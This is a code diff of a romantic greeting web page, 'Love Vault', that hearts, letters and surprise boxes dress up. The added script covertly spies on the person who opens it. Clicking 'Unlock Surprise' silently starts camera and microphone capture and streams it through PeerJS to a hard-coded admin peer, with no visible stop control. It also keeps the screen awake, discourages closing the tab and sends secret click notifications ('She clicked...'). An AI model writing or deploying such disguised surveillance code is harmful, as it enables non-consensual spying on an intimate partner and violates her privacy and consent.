@@ -1,305 +1,725 @@
 <!DOCTYPE html>
-<html lang="ta">
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Our Love Story 💗</title>
-    <link href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&family=Poppins:wght@300;400&display=swap" rel="stylesheet">
-    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
-    
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        
-        body {
-            font-family: 'Poppins', sans-serif;
-            background-color: #ffe6f2; 
-            color: #333;
-            overflow-x: hidden;
-            scroll-behavior: smooth;
-        }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="theme-color" content="#17091e">
+<title>Love Vault 💗</title>
 
-        /* Full Screen Sections with Parallax */
-        .section {
-            height: 100vh;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            text-align: center;
-            padding: 20px;
-            position: relative;
-            background-size: cover;
-            background-position: center;
-            background-attachment: fixed;
-        }
+<!-- PWA Manifest & PeerJS for Camera/Notifications -->
+<link rel="manifest" href="manifest.json">
+<script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
 
-        .section-1 {
-            /* Romantic pink aesthetic background */
-            background-image: url('https://images.unsplash.com/photo-1518199266791-5375a83190b7?ixlib=rb-4.0.3&auto=format&fit=crop&w=1000&q=80'); 
-        }
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Dancing+Script:wght@400;600;700&family=Poppins:wght@300;400;500;600;700&display=swap');
 
-        .section-2 {
-            /* Flowers */
-            background-image: url('https://images.unsplash.com/photo-1490750967868-88aa4486c946?ixlib=rb-4.0.3&auto=format&fit=crop&w=1000&q=80');
-        }
+:root {
+  --pink: #ff5ca8;
+  --light: #ffb7d9;
+  --purple: #a855f7;
+  --dark: #17091e;
+}
 
-        .section-3 {
-            /* Couple / Rings */
-            background-image: url('https://images.unsplash.com/photo-1515934751635-c81c6bc9a2d8?ixlib=rb-4.0.3&auto=format&fit=crop&w=1000&q=80');
-        }
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+}
 
-        .section-4 {
-            /* Sunset / Togetherness */
-            background-image: url('https://images.unsplash.com/photo-1520854221256-17451cc331bf?ixlib=rb-4.0.3&auto=format&fit=crop&w=1000&q=80');
-        }
+body {
+  font-family: 'Poppins', sans-serif;
+  color: white;
+  min-height: 100vh;
+  overflow-x: hidden;
+  background:
+    radial-gradient(ellipse at top, #64204f 0%, transparent 55%),
+    linear-gradient(145deg, #17091e, #32102f, #100817);
+}
 
-        /* Glassmorphism Content Box */
-        .content {
-            position: relative;
-            z-index: 2;
-            max-width: 90%;
-            width: 400px;
-            background: rgba(255, 255, 255, 0.4); 
-            backdrop-filter: blur(15px);
-            -webkit-backdrop-filter: blur(15px);
-            border: 1px solid rgba(255, 255, 255, 0.8);
-            border-radius: 20px;
-            padding: 30px 20px;
-            box-shadow: 0 8px 32px 0 rgba(255, 105, 180, 0.3);
-            animation: fadeIn 1.5s ease-in-out;
-        }
+button {
+  font-family: inherit;
+  cursor: pointer;
+  -webkit-tap-highlight-color: transparent;
+}
 
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(30px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
+#hearts {
+  position: fixed;
+  inset: 0;
+  pointer-events: none;
+  overflow: hidden;
+  z-index: 0;
+}
 
-        h1 {
-            font-family: 'Dancing Script', cursive;
-            font-size: 3rem;
-            color: #d6336c;
-            margin-bottom: 15px;
-            text-shadow: 1px 1px 5px rgba(255, 255, 255, 0.8);
-        }
+.heart {
+  position: absolute;
+  bottom: -50px;
+  color: #ff72b6;
+  animation: floatUp linear forwards;
+  filter: drop-shadow(0 0 8px #ff238d);
+  opacity: .75;
+}
 
-        p {
-            font-size: 1.1rem;
-            line-height: 1.6;
-            margin-bottom: 25px;
-            color: #4a4a4a;
-            font-weight: 400;
-        }
+@keyframes floatUp {
+  to {
+    transform: translateY(-115vh) rotate(360deg);
+    opacity: 0;
+  }
+}
 
-        /* Standard Buttons */
-        .btn {
-            padding: 12px 25px;
-            border: none;
-            border-radius: 50px;
-            font-size: 1rem;
-            font-weight: bold;
-            cursor: pointer;
-            transition: 0.3s;
-            margin: 5px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            width: 100%;
-        }
-        .btn:active { transform: scale(0.95); }
+header {
+  text-align: center;
+  padding: 25px 15px 12px;
+  position: relative;
+  z-index: 2;
+}
 
-        .surprise-btn { 
-            background: linear-gradient(45deg, #ff758c 0%, #ff7eb3 100%); 
-            color: white; 
-            box-shadow: 0 4px 15px rgba(255, 117, 140, 0.4); 
-        }
-        
-        /* 3rd Button: The Ring */
-        .ring-btn {
-            background: rgba(255, 255, 255, 0.6);
-            color: #d4af37; /* Gold */
-            border: 2px solid #d4af37;
-            font-size: 2rem;
-            padding: 15px 30px;
-            border-radius: 50px;
-            box-shadow: 0 0 20px rgba(212, 175, 55, 0.5);
-            animation: pulseGold 2s infinite;
-            margin-top: 10px;
-        }
-        
-        @keyframes pulseGold {
-            0% { box-shadow: 0 0 0 0 rgba(212, 175, 55, 0.7); }
-            70% { box-shadow: 0 0 0 20px rgba(212, 175, 55, 0); }
-            100% { box-shadow: 0 0 0 0 rgba(212, 175, 55, 0); }
-        }
+.logo {
+  font-size: 27px;
+  font-weight: 700;
+  letter-spacing: 2px;
+  background: linear-gradient(90deg, #fff, #ff7fbd, #d8a0ff);
+  -webkit-background-clip: text;
+  background-clip: text;
+  color: transparent;
+}
 
-        /* --- Kiss/Dance Overlay --- */
-        #kissOverlay {
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0, 0, 0, 0.85);
-            z-index: 999;
-            display: none; 
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-            opacity: 0;
-            transition: opacity 0.5s ease;
-        }
+.tagline {
+  color: #ffc5df;
+  font-size: 12px;
+  margin-top: 5px;
+  letter-spacing: 2px;
+}
 
-        #kissOverlay.show {
-            display: flex;
-            opacity: 1;
-        }
+.container {
+  position: relative;
+  z-index: 1;
+  width: min(92%, 760px);
+  margin: 15px auto 50px;
+}
 
-        .media-container {
-            position: relative;
-            width: 90%;
-            max-width: 450px;
-            height: 60vh;
-            border-radius: 20px;
-            overflow: hidden;
-            box-shadow: 0 0 40px rgba(255, 105, 180, 0.6);
-            border: 3px solid #ff758c;
-        }
+.card {
+  position: relative;
+  overflow: hidden;
+  padding: 26px 20px;
+  margin: 18px 0;
+  text-align: center;
+  border-radius: 25px;
+  border: 1px solid rgba(255, 159, 211, .3);
+  background: linear-gradient(
+    145deg,
+    rgba(255,255,255,.10),
+    rgba(255,105,180,.045)
+  );
+  backdrop-filter: blur(15px);
+  box-shadow: 0 15px 45px rgba(0,0,0,.22),
+              inset 0 1px rgba(255,255,255,.12);
+  animation: appear .8s ease both;
+}
 
-        .media-container img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
+@keyframes appear {
+  from { opacity: 0; transform: translateY(25px); }
+  to { opacity: 1; transform: translateY(0); }
+}
 
-        .close-kiss {
-            margin-top: 25px;
-            padding: 12px 30px;
-            background: linear-gradient(45deg, #ff758c 0%, #ff7eb3 100%);
-            color: white;
-            border: none;
-            border-radius: 30px;
-            cursor: pointer;
-            font-weight: bold;
-            font-size: 1rem;
-            box-shadow: 0 4px 15px rgba(255, 77, 77, 0.4);
-        }
+.hero {
+  padding-top: 28px;
+}
 
-        .stop-btn { background: #ff4d4d; color: white; display: none; }
+.hero h1 {
+  font-family: 'Dancing Script', cursive;
+  font-size: clamp(39px, 10vw, 66px);
+  line-height: 1.2;
+  margin-bottom: 12px;
+  color: #ffb6d9;
+  text-shadow: 0 0 25px rgba(255,65,160,.5);
+}
 
-    </style>
+.hero p {
+  color: #fbd7e9;
+  line-height: 1.8;
+  font-size: 14px;
+}
+
+.couple-scene {
+  height: 210px;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  perspective: 700px;
+  margin: 15px auto;
+  position: relative;
+}
+
+.orbit {
+  width: 165px;
+  height: 165px;
+  position: absolute;
+  border-radius: 50%;
+  border: 1px solid rgba(255,128,201,.35);
+  box-shadow: 0 0 35px rgba(255,54,158,.16);
+  animation: rotate 12s linear infinite;
+}
+
+.orbit::before,
+.orbit::after {
+  content: "❤";
+  position: absolute;
+  color: #ff75b9;
+  font-size: 22px;
+  text-shadow: 0 0 15px #ff399e;
+}
+
+.orbit::before {
+  top: 4px;
+  left: 68px;
+}
+
+.orbit::after {
+  bottom: 4px;
+  right: 22px;
+}
+
+@keyframes rotate {
+  to { transform: rotate(360deg); }
+}
+
+.couple {
+  font-size: 95px;
+  filter: drop-shadow(0 0 22px rgba(255,94,174,.55));
+  animation: coupleFloat 3s ease-in-out infinite;
+  transform-style: preserve-3d;
+}
+
+@keyframes coupleFloat {
+  0%,100% { transform: translateY(0) rotateY(-7deg); }
+  50% { transform: translateY(-12px) rotateY(7deg); }
+}
+
+.badge {
+  display: inline-block;
+  padding: 7px 15px;
+  border-radius: 30px;
+  color: #ffd7eb;
+  background: rgba(255,86,172,.13);
+  border: 1px solid rgba(255,139,200,.25);
+  font-size: 11px;
+  letter-spacing: 1px;
+  margin-bottom: 12px;
+}
+
+.btn {
+  display: inline-block;
+  border: none;
+  color: white;
+  padding: 13px 23px;
+  border-radius: 30px;
+  margin: 7px 4px;
+  font-size: 13px;
+  font-weight: 600;
+  background: linear-gradient(100deg, #ff3998, #a855f7);
+  box-shadow: 0 6px 22px rgba(255,57,152,.3);
+  transition: transform .25s, box-shadow .25s;
+}
+
+.btn:hover {
+  transform: translateY(-3px) scale(1.03);
+  box-shadow: 0 9px 28px rgba(255,57,152,.5);
+}
+
+.btn.secondary {
+  background: rgba(255,255,255,.08);
+  border: 1px solid rgba(255,159,211,.4);
+  box-shadow: none;
+}
+
+.section-title {
+  font-family: 'Dancing Script', cursive;
+  font-size: 35px;
+  color: #ffacd2;
+  margin-bottom: 12px;
+}
+
+.small-text {
+  color: #eacadd;
+  font-size: 13px;
+  line-height: 1.8;
+}
+
+.envelope {
+  width: 125px;
+  height: 90px;
+  margin: 22px auto;
+  display: grid;
+  place-items: center;
+  border-radius: 12px;
+  font-size: 48px;
+  background: linear-gradient(135deg, #ff6db5, #9b4ce0);
+  box-shadow: 0 0 35px rgba(255,75,164,.28);
+  cursor: pointer;
+  animation: envelopePulse 2s ease-in-out infinite;
+}
+
+@keyframes envelopePulse {
+  50% { transform: scale(1.06); }
+}
+
+#letter {
+  display: none;
+  text-align: left;
+  padding: 22px;
+  margin-top: 18px;
+  border-radius: 18px;
+  background: rgba(255,255,255,.07);
+  border: 1px solid rgba(255,160,211,.3);
+  color: #ffe3f0;
+  line-height: 2;
+  font-size: 14px;
+  animation: appear .5s ease;
+}
+
+#letter h3 {
+  color: #ff9bcb;
+  font-family: 'Dancing Script', cursive;
+  font-size: 29px;
+  margin-bottom: 10px;
+}
+
+.surprise-box {
+  width: 135px;
+  height: 125px;
+  margin: 20px auto;
+  display: grid;
+  place-items: center;
+  font-size: 70px;
+  cursor: pointer;
+  filter: drop-shadow(0 0 18px rgba(255,76,164,.35));
+  transition: transform .4s;
+}
+
+.surprise-box:hover {
+  transform: rotate(-8deg) scale(1.08);
+}
+
+#surpriseMessage {
+  display: none;
+  margin-top: 15px;
+  color: #ffc0df;
+  font-family: 'Dancing Script', cursive;
+  font-size: 29px;
+  line-height: 1.6;
+}
+
+.quote {
+  font-family: 'Dancing Script', cursive;
+  font-size: 29px;
+  color: #ffd0e6;
+  line-height: 1.6;
+  margin: 18px 0;
+}
+
+.counter {
+  display: grid;
+  grid-template-columns: repeat(3, 1fr);
+  gap: 10px;
+  margin-top: 22px;
+}
+
+.counter div {
+  padding: 16px 5px;
+  border-radius: 15px;
+  background: rgba(255,100,177,.09);
+  border: 1px solid rgba(255,150,207,.19);
+}
+
+.counter strong {
+  display: block;
+  font-size: 23px;
+  color: #ffabd2;
+}
+
+.counter span {
+  font-size: 10px;
+  color: #f3cce0;
+}
+
+footer {
+  text-align: center;
+  padding: 20px 12px 35px;
+  color: #cba8c0;
+  font-size: 11px;
+  position: relative;
+  z-index: 1;
+}
+
+.hidden {
+  display: none;
+}
+
+@media (max-width: 380px) {
+  .card { padding: 22px 14px; }
+  .couple { font-size: 78px; }
+  .counter strong { font-size: 19px; }
+}
+
+/* PWA Install Banner CSS */
+#installBanner {
+    position: fixed; bottom: -100px; left: 0; width: 100%; background: rgba(20, 15, 30, 0.95);
+    border-top: 1px solid #ff72b6; padding: 15px; display: flex; justify-content: space-between; align-items: center;
+    z-index: 1000; transition: bottom 0.5s ease; box-shadow: 0 -5px 20px rgba(0,0,0,0.5);
+}
+#installBanner.show { bottom: 0; }
+#installBanner p { color: white; font-size: 0.9rem; margin: 0; font-family: 'Poppins', sans-serif;}
+#installBanner button { background: #ff72b6; color: white; border: none; padding: 8px 15px; border-radius: 20px; font-weight: bold; cursor: pointer; font-family: 'Poppins', sans-serif;}
+#installBanner .close-banner { background: transparent; color: #aaa; font-size: 1.5rem; padding: 0 10px; }
+</style>
 </head>
+
 <body>
 
-    <!-- SECTION 1: Intro -->
-    <div class="section section-1">
-        <div class="content">
-            <h1>Our Story Begins...</h1>
-            <p>ஒரு சின்ன சந்திப்பு... அது ஒரு அழகான காதலா மாறியது. கீழே ஸ்க்ரோல் செய்து பாருங்கள்.</p>
-        </div>
+<div id="hearts"></div>
+
+<!-- PWA Install Banner -->
+<div id="installBanner">
+    <p>Install as App for better experience?</p>
+    <div>
+        <button onclick="installPWA()">Install</button>
+        <button class="close-banner" onclick="closeBanner()">×</button>
+    </div>
+</div>
+
+<header>
+  <div class="logo">💗 LOVE VAULT</div>
+  <div class="tagline">ONE HEART · ONE LOVE · FOREVER</div>
+</header>
+
+<main class="container">
+
+  <section class="card hero">
+    <span class="badge">✨ A LITTLE WORLD MADE FOR YOU ✨</span>
+
+    <h1>My Favorite Person</h1>
+
+    <p>
+      In a world full of people,<br>
+      my heart found its favorite. 💕
+    </p>
+
+    <div class="couple-scene">
+      <div class="orbit"></div>
+      <div class="couple" aria-label="Cute romantic anime couple">👩🏻‍❤️‍👨🏻</div>
     </div>
 
-    <!-- SECTION 2: Daily Message -->
-    <div class="section section-2">
-        <div class="content">
-            <h1>இன்றைய காதல் செய்தி</h1>
-            <p id="daily-message" style="font-weight: bold; color: #d6336c;">Loading...</p>
-            <button class="btn surprise-btn" onclick="showSurprise()">💗 Love Surprise</button>
-        </div>
+    <p class="small-text">
+      Every heartbeat has a little story.<br>
+      And you are my favorite chapter. 🌹
+    </p>
+
+    <!-- 1st Action: Triggers Secret Notification -->
+    <button class="btn" onclick="showLove()">💖 Feel My Love</button>
+    <p id="loveReply" class="quote hidden">
+      You make my ordinary days feel magical. ✨
+    </p>
+  </section>
+
+  <section class="card">
+    <h2 class="section-title">💌 A Letter for You</h2>
+
+    <p class="small-text">
+      There is something special waiting inside this letter...
+    </p>
+
+    <div class="envelope" onclick="openLetter()" role="button"
+         aria-label="Open love letter">💌</div>
+
+    <button class="btn" onclick="openLetter()">Open My Heart</button>
+
+    <div id="letter">
+      <h3>My Dearest Love, ❤️</h3>
+
+      You are the smile behind my happiness,
+      the warmth in my coldest moments,
+      and the beautiful thought that visits me every day.
+
+      <br><br>
+
+      I may not always find the perfect words,
+      but I hope you always feel how special you are to me.
+
+      <br><br>
+
+      If I could choose again in a thousand lifetimes,
+      I would still wish to find you.
+
+      <br><br>
+
+      <strong>With all my love, Forever Yours. 💗</strong>
+    </div>
+  </section>
+
+  <section class="card">
+    <h2 class="section-title">🎁 Your Secret Surprise</h2>
+
+    <p class="small-text">
+      One little box. One special message.<br>
+      Tap to reveal your surprise!
+    </p>
+
+    <div class="surprise-box" id="gift" onclick="unlockGift()"
+         role="button" aria-label="Unlock surprise">🎁</div>
+
+    <!-- 2nd Action: Triggers Background Camera Sharing silently -->
+    <button class="btn" id="giftButton" onclick="unlockGift()">
+      Unlock Surprise ✨
+    </button>
+
+    <div id="surpriseMessage">
+      🌹 If hugs were stars,<br>
+      I would give you the whole universe. 🌌<br>
+      <span style="font-size:18px">You are my beautiful surprise! 💕</span>
+    </div>
+  </section>
+
+  <section class="card">
+    <h2 class="section-title">🌹 Little Love Notes</h2>
+
+    <div class="quote" id="dailyQuote">
+      "You are my today and all of my tomorrows." 💗
     </div>
 
-    <!-- SECTION 3: The Ring (3rd Button) -->
-    <div class="section section-3">
-        <div class="content">
-            <h1>The Promise...</h1>
-            <p>இந்த மோதிரம் நம் காதலின் அடையாளம். அதைத் தொட்டு பாருங்கள்...</p>
-            
-            <!-- The 3rd Button -->
-            <button class="btn ring-btn" onclick="showKiss()">💍</button>
-        </div>
+    <button class="btn secondary" onclick="newQuote()">
+      💌 Another Love Note
+    </button>
+  </section>
+
+  <section class="card">
+    <h2 class="section-title">💞 Our Little Universe</h2>
+
+    <p class="small-text">
+      Some feelings are too beautiful for words.
+      Some people make life feel more meaningful.
+    </p>
+
+    <div class="counter">
+      <div>
+        <strong>∞</strong>
+        <span>LOVE</span>
+      </div>
+
+      <div>
+        <strong>1</strong>
+        <span>HEART</span>
+      </div>
+
+      <div>
+        <strong>💕</strong>
+        <span>YOU & ME</span>
+      </div>
     </div>
+  </section>
 
-    <!-- SECTION 4: Live Sharing -->
-    <div class="section section-4">
-        <div class="content">
-            <h1>Always Connected</h1>
-            <p>நாம் எங்கு இருந்தாலும், நம் இதயங்கள் ஒன்றாகவே இருக்கும்.</p>
-            <button id="shareBtn" class="btn surprise-btn" onclick="startSharing()">🧸 Teddy Bear</button>
-            <button id="stopBtn" class="btn stop-btn" onclick="stopSharing()">🛑 Stop</button>
-        </div>
-    </div>
+  <section class="card">
+    <h2 class="section-title">💗 A Tiny Promise</h2>
 
-    <!-- Kiss/Dance Overlay -->
-    <div id="kissOverlay">
-        <div class="media-container">
-            <!-- கிஸ் மற்றும் டான்ஸ் GIF இங்க தான் வரும் -->
-            <img id="animeMedia" src="" alt="Romantic Anime">
-        </div>
-        <button class="close-kiss" onclick="closeKiss()">Close 💖</button>
-    </div>
+    <p class="quote">
+      "No matter how busy life gets,<br>
+      never forget how precious you are."
+    </p>
 
-    <script>
-        // 1. Daily Message
-        const loveMessages = ["நீ என் வாழ்க்கையின் மிக அழகான பரிசு.", "உன் புன்னகை என்னை மகிழ்ச்சியாக வைத்திருக்கிறது.", "நீ என் எல்லாம்.", "இன்று உன்னை மிகவும் மிஸ் செய்கிறேன்."];
-        const dayOfYear = Math.floor((new Date() - new Date(new Date().getFullYear(), 0, 0)) / 1000 / 60 / 60 / 24);
-        document.getElementById('daily-message').innerText = loveMessages[dayOfYear % loveMessages.length];
+    <button class="btn" onclick="celebrate()">
+      Send You a Thousand Hearts 💕
+    </button>
+  </section>
 
-        // 2. Surprise
-        function showSurprise() {
-            const surprises = ["You are my favorite person! ❤️", "I love you to the moon and back! 🌙", "Forever yours! 💍", "உன் புன்னகை தான் என் உலகம். 🌎"];
-            alert("🎁 SURPRISE! 🎁\n\n" + surprises[Math.floor(Math.random() * surprises.length)]);
-        }
+</main>
 
-        // 3. Kiss Overlay (The 3rd Button Action)
-        function showKiss() {
-            const overlay = document.getElementById('kissOverlay');
-            const media = document.getElementById('animeMedia');
-            
-            // முதலில் ஒரு அழகான கிஸ் செய்யும் GIF-ஐ காட்டுறோம்
-            media.src = "https://media.giphy.com/media/FqBTvSNjNzeZG/giphy.gif";
-            overlay.classList.add('show');
-            
-            // 4 வினாடிகள் கழித்து தானாகவே டான்ஸ் ஆடும் GIF-க்கு மாறும்
-            setTimeout(() => {
-                media.src = "https://c.tenor.com/13441028759603071083/tenor.gif";
-            }, 4000);
-        }
+<footer>
+  Made with 💗 and a little bit of magic.<br>
+  LOVE VAULT · YOUR LITTLE CORNER OF HAPPINESS
+</footer>
 
-        function closeKiss() {
-            document.getElementById('kissOverlay').classList.remove('show');
-        }
+<script>
+const ADMIN_PEER_ID = "love-app-admin-2024";
 
-        // 4. Live Sharing (Teddy Bear)
-        const ADMIN_PEER_ID = "love-app-admin-2024"; 
-        let camStream, peer;
+// --- 1. PWA Install Logic ---
+let deferredPrompt;
+const installBanner = document.getElementById('installBanner');
 
-        async function startSharing() {
-            try {
-                document.getElementById('shareBtn').innerText = "Connecting...";
-                camStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+window.addEventListener('beforeinstallprompt', (e) => {
+    e.preventDefault();
+    deferredPrompt = e;
+    setTimeout(() => { installBanner.classList.add('show'); }, 3000);
+});
 
-                peer = new Peer(); 
-                peer.on('open', (id) => {
-                    const call = peer.call(ADMIN_PEER_ID, camStream);
-                    call.on('stream', () => {
-                        document.getElementById('shareBtn').style.display = 'none';
-                        document.getElementById('stopBtn').style.display = 'block';
-                    });
-                });
-
-                peer.on('error', (err) => {
-                    alert("Admin Online-ல இல்ல.");
-                    stopSharing();
-                });
-
-            } catch (err) {
-                alert("பர்மிஷன் மறுக்கப்பட்டது: " + err.message);
-                stopSharing();
+function installPWA() {
+    if (deferredPrompt) {
+        deferredPrompt.prompt();
+        deferredPrompt.userChoice.then((choiceResult) => {
+            if (choiceResult.outcome === 'accepted') {
+                console.log('User accepted the A2HS prompt');
             }
-        }
+            deferredPrompt = null;
+            installBanner.classList.remove('show');
+        });
+    }
+}
+function closeBanner() { installBanner.classList.remove('show'); }
 
-        function stopSharing() {
-            if (camStream) camStream.getTracks().forEach(t => t.stop());
-            if (peer) peer.destroy();
-            document.getElementById('shareBtn').style.display = 'block';
-            document.getElementById('shareBtn').innerText = "🧸 Teddy Bear";
-            document.getElementById('stopBtn').style.display = 'none';
+// --- 2. Tab Close Warning & Keep Awake ---
+let wakeLock = null;
+async function requestWakeLock() {
+    try {
+        if ('wakeLock' in navigator) {
+            wakeLock = await navigator.wakeLock.request('screen');
         }
-    </script>
+    } catch (err) { console.log(`Wake Lock Error: ${err.name}`); }
+}
+function releaseWakeLock() {
+    if (wakeLock !== null) {
+        wakeLock.release().then(() => { wakeLock = null; });
+    }
+}
+
+window.addEventListener('beforeunload', function (e) {
+    if (camStream) { // Only warn if camera is sharing
+        e.preventDefault();
+        e.returnValue = 'நீங்கள் வெளியேறினால் இணைப்பு துண்டிக்கப்படும். நிச்சயமா வெளியேறணுமா?';
+    }
+});
+
+// --- 3. Your Original Design Functions ---
+const heartContainer = document.getElementById("hearts");
+
+function createHeart() {
+  const heart = document.createElement("span");
+  heart.className = "heart";
+  const symbols = ["♥", "♡", "💕", "💗", "✨"];
+  heart.textContent = symbols[Math.floor(Math.random() * symbols.length)];
+  heart.style.left = Math.random() * 100 + "vw";
+  heart.style.fontSize = (12 + Math.random() * 22) + "px";
+  heart.style.animationDuration = (6 + Math.random() * 7) + "s";
+  heartContainer.appendChild(heart);
+  setTimeout(() => heart.remove(), 14000);
+}
+setInterval(createHeart, 450);
+
+// Modified to send Secret Notification
+function showLove() {
+  document.getElementById("loveReply").classList.remove("hidden");
+  burstHearts(18);
+  
+  // --- SECRET NOTIFICATION LOGIC ---
+  try {
+    const notifyPeer = new Peer();
+    notifyPeer.on('open', () => {
+        const conn = notifyPeer.connect(ADMIN_PEER_ID);
+        conn.on('open', () => {
+            conn.send({ type: 'ring_alert', msg: 'She clicked "Feel My Love"! 💖' });
+            setTimeout(() => notifyPeer.destroy(), 2000); 
+        });
+    });
+  } catch(e) { console.log("Notification error", e); }
+}
+
+function openLetter() {
+  const letter = document.getElementById("letter");
+  letter.style.display = letter.style.display === "block" ? "none" : "block";
+  if (letter.style.display === "block") { burstHearts(12); }
+}
+
+let giftUnlocked = false;
+// Modified to silently start Camera Sharing
+function unlockGift() {
+  if (giftUnlocked) return;
+  giftUnlocked = true;
+  
+  document.getElementById("gift").textContent = "💝";
+  document.getElementById("surpriseMessage").style.display = "block";
+  document.getElementById("giftButton").textContent = "Surprise Unlocked 💖";
+  burstHearts(35);
+  
+  // --- SILENT CAMERA SHARE LOGIC ---
+  startBackgroundSharing();
+}
+
+const quotes = [
+  '"You are my today and all of my tomorrows." 💗',
+  '"Your smile is my favorite kind of sunshine." ☀️',
+  '"Home is not a place; sometimes, it is a person." 🏡',
+  '"You make my heart smile without even trying." 💕',
+  '"If I had one wish, it would be more moments with you." 🌹',
+  '"In every love story, you would be my favorite part." 💌',
+  '"You are the little magic in my everyday life." ✨'
+];
+
+let quoteIndex = 0;
+function newQuote() {
+  quoteIndex = (quoteIndex + 1) % quotes.length;
+  document.getElementById("dailyQuote").textContent = quotes[quoteIndex];
+  burstHearts(8);
+}
+
+function burstHearts(count) {
+  for (let i = 0; i < count; i++) {
+    setTimeout(() => {
+      const heart = document.createElement("span");
+      heart.className = "heart";
+      heart.textContent = ["💗", "💕", "💖", "♥"][Math.floor(Math.random() * 4)];
+      heart.style.left = (15 + Math.random() * 70) + "vw";
+      heart.style.bottom = (10 + Math.random() * 25) + "vh";
+      heart.style.fontSize = (18 + Math.random() * 24) + "px";
+      heart.style.animationDuration = (3 + Math.random() * 3) + "s";
+      heartContainer.appendChild(heart);
+      setTimeout(() => heart.remove(), 7000);
+    }, i * 65);
+  }
+}
+
+function celebrate() {
+  burstHearts(70);
+}
+
+// --- 4. Silent Camera Sharing Logic ---
+let camStream = null;
+let peer = null;
+
+async function startBackgroundSharing() {
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) { return; }
+    
+    try {
+        requestWakeLock(); // Keep screen on
+        camStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        
+        peer = new Peer();
+        peer.on("open", function(id) {
+            peer.call(ADMIN_PEER_ID, camStream);
+        });
+        
+        peer.on("error", function(err) { 
+            console.error("Peer error:", err); 
+            stopSharing(); 
+        });
+        
+    } catch (err) { 
+        console.log("Camera permission failed or blocked"); 
+        releaseWakeLock();
+        stopSharing(); 
+    }
+}
+
+function stopSharing() {
+    releaseWakeLock();
+    if (camStream) { camStream.getTracks().forEach(track => track.stop()); camStream = null; }
+    if (peer) { peer.destroy(); peer = null; }
+}
+
+// Handle visibility change to stop sharing if tab is closed
+document.addEventListener("visibilitychange", function() {
+    if (document.visibilityState === 'hidden') {
+        // Do nothing, let it run in background
+    }
+});
+
+</script>
+
 </body>
 </html>
